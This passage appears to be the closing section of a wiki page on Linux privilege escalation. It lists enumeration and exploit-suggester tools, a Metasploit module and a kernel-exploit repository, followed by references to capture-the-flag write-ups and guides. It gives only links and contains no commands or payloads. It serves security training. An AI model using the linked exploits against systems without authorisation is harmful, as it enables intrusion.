**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [0xdf – HTB Slonik (pg_basebackup cron copy → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
